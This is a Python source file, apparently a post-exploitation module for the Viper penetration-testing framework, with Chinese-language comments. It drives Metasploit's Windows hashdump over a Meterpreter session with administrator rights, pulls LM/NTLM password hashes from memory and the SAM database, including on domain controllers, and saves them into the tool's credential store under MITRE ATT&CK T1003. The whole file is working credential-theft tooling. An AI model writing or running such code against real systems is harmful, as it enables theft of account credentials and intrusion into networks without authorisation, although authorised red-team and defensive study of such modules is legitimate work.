# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :


from PostModule.module import *


class PostModule(PostMSFRawModule):
    NAME = "获取Windows内存Hash"
    DESC = "此模块使用Hashdump抓取内存及SAM数据库中的Hask.\n" \
           "针对DC的Haskdump的耗时与域用户数量成正比."
    REQUIRE_SESSION = True
    MODULETYPE = TAG2CH.Credential_Access
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = ["T1003"]  # ATTCK向量
    REFERENCES = ["https://attack.mitre.org/techniques/T1003/"]
    AUTHOR = "Viper"

    def __init__(self, sessionid, hid, custom_param):
        super().__init__(sessionid, hid, custom_param)
        self.type = "post"
        self.mname = "windows/gather/hashdump_api"

    def check(self):
        """执行前的检查函数"""
        from PostModule.lib.Session import Session
        self.session = Session(self._sessionid)

        if self.session.is_windows is not True:
            return False, "此模块只支持Windows的Meterpreter"
        if self.session.is_admin is not True:
            return False, "此模块需要管理员权限,请尝试提权"
        return True, None

    def callback(self, status, message, data):
        if status:
            self.log_status("获取Hash列表:")
            domain = self.session.domain
            # {'user_name': 'Administrator', 'user_id': '500', 'lanman': 'aad3b435b51404eeaad3b435b51404XX',
            #  'ntlm': '31d6cfe0d16ae931b73c59d7e0c089XX',
            #  'hash_string': 'Administrator:500:aad3b435b51404eeaad3b435b51404XX:31d6cfe0d16ae931b73c59d7e0c089XX:::'}
            for record in data:
                self.log_raw(record.get("hash_string"))
                try:
                    type = "Hash"
                    user = record.get("user_name")
                    if user.endswith("$") or user == "Guest":
                        continue
                    password = f"{record.get('lanman')}:{record.get('ntlm')}"
                    tag = {'domain': domain, 'type': type}
                    Credential.add_credential(username=user, password=password,
                                              password_type='windows', tag=tag,
                                              source_module=self.NAME, host_ipaddress=Host.get_ipaddress(self._hid),
                                              desc='')
                except Exception as E:
                    self.log_except(E)
                    continue
        else:
            print_str = "运行失败:{}".format(message)
            self.log_error(print_str)
        self.log_status("Hash已存储,可以到<数据管理>-<凭证>页面查看")
